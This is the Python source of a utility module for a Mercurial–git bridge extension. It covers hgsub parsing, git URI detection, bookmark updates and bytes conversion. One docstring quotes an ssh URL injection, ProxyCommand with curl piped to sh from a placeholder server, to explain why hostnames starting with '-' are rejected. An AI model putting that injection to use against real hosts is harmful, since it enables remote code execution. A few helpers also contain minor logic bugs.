"""Compatibility functions for old Mercurial versions and other utility
functions."""
import os
import re
import urllib

try:
    from collections import OrderedDict
except ImportError:
    from ordereddict import OrderedDict

from dulwich import errors
from mercurial.i18n import _
from mercurial import (
    error,
    lock as lockmod,
    util as hgutil,
    registrar,
)

gitschemes = ('git', 'git+ssh', 'git+http', 'git+https')


def parse_hgsub(lines):
    """Fills OrderedDict with hgsub file content passed as list of lines"""
    rv = OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls[0] == '#':
            continue
        name, value = l.split('=', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsub(data):
    """Produces a string from OrderedDict hgsub content"""
    return ''.join(['%s = %s\n' % (n, v) for n, v in data.iteritems()])


def parse_hgsubstate(lines):
    """Fills OrderedDict with hgsubtate file content passed as list of lines"""
    rv = OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls[0] == '#':
            continue
        value, name = l.split(' ', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsubstate(data):
    """Produces a string from OrderedDict hgsubstate content"""
    return ''.join(['%s %s\n' % (data[n], n) for n in sorted(data)])


def transform_notgit(f):
    '''use as a decorator around functions that call into dulwich'''
    def inner(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except errors.NotGitRepository:
            raise error.Abort('not a git repository')
    return inner


def isgitsshuri(uri):
    """Method that returns True if a uri looks like git-style uri

    Tests:

    >>> print(isgitsshuri('http://fqdn.com/hg'))
    False
    >>> print(isgitsshuri('http://fqdn.com/test.git'))
    False
    >>> print(isgitsshuri('git@github.com:user/repo.git'))
    True
    >>> print(isgitsshuri('github-123.com:user/repo.git'))
    True
    >>> print(isgitsshuri('git@127.0.0.1:repo.git'))
    True
    >>> print(isgitsshuri('git@[2001:db8::1]:repository.git'))
    True
    """
    for scheme in gitschemes:
        if uri.startswith('%s://' % scheme):
            return False

    if uri.startswith('http:') or uri.startswith('https:'):
        return False

    m = re.match(r'(?:.+@)*([\[]?[\w\d\.\:\-]+[\]]?):(.*)', uri)
    if m:
        # here we're being fairly conservative about what we consider to be git
        # urls
        giturl, repopath = m.groups()
        # definitely a git repo
        if repopath.endswith('.git'):
            return True
        # use a simple regex to check if it is a fqdn regex
        fqdn_re = (r'(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}'
                   r'(?<!-)\.)+[a-zA-Z]{2,63}$)')
        if re.match(fqdn_re, giturl):
            return True
    return False


def updatebookmarks(repo, changes, name='git_handler'):
    """abstract writing bookmarks for backwards compatibility"""
    bms = repo._bookmarks
    tr = lock = wlock = None
    try:
        wlock = repo.wlock()
        lock = repo.lock()
        tr = repo.transaction(name)
        if hgutil.safehasattr(bms, 'applychanges'):
            # applychanges was added in mercurial 4.3
            bms.applychanges(repo, tr, changes)
        else:
            for name, node in changes:
                if node is None:
                    del bms[name]
                else:
                    bms[name] = node
            if hgutil.safehasattr(bms, 'recordchange'):
                # recordchange was added in mercurial 3.2
                bms.recordchange(tr)
            else:
                bms.write()
        tr.close()
    finally:
        lockmod.release(tr, lock, wlock)


def checksafessh(host):
    """check if a hostname is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    host = urllib.parse.unquote(host)
    if host.startswith('-'):
        raise error.Abort(_('potentially unsafe hostname: %r') %
                          (host,))


def get_value(d, key):
    v = d.get(key, None)

    if not None and type(key) == str:
        k = key.encode('utf-8')
        v = d.get(k, None)

    if v:
        return v

    raise(Exception('%s is not in the dict' % key))


def to_bytes(v):
    if type(v) != bytes:
        v = str(v).encode('utf-8')

    return v


def convert(data, frm=str, to=bytes):
    if isinstance(data, frm):
        return to(data, 'utf-8')

    if isinstance(data, dict):
        return dict(map(convert, data.items()))

    if isinstance(data, tuple):
        return tuple(map(convert, data))

    if isinstance(data, list):
        return list(map(convert, data))

    return data


def to_str(v):
    if type(v) == bytes:
        v = v.decode('utf-8')

    return v

# def join(v1, v2, is_types=True):
#     v = to_bytes(v1) + to_bytes(v2)
#
#     if is_types:
#         return v
#
#     return v.decode('utf-8')


def path_join(a, *p):
    p2 = []
    for x in p:
        p2.append(to_bytes(x))
    v = os.path.join_orig(to_bytes(a), *p2)

    return v


def lstrip(vstr, p):
    return vstr.lstrip(to_bytes(p))


class command(registrar.command):
    def _doregister(self, func, name, options=(), synopsis=None,
                    norepo=False, optionalrepo=False, inferrepo=False,
                    intents=None, helpcategory=None, helpbasic=False):
        if type(name) == str:
            name = name.encode('utf-8')
        return super(command, self)._doregister(func, name, options=options, synopsis=synopsis,
                    norepo=norepo, optionalrepo=optionalrepo, inferrepo=inferrepo,
                    intents=intents, helpcategory=helpcategory, helpbasic=helpbasic)
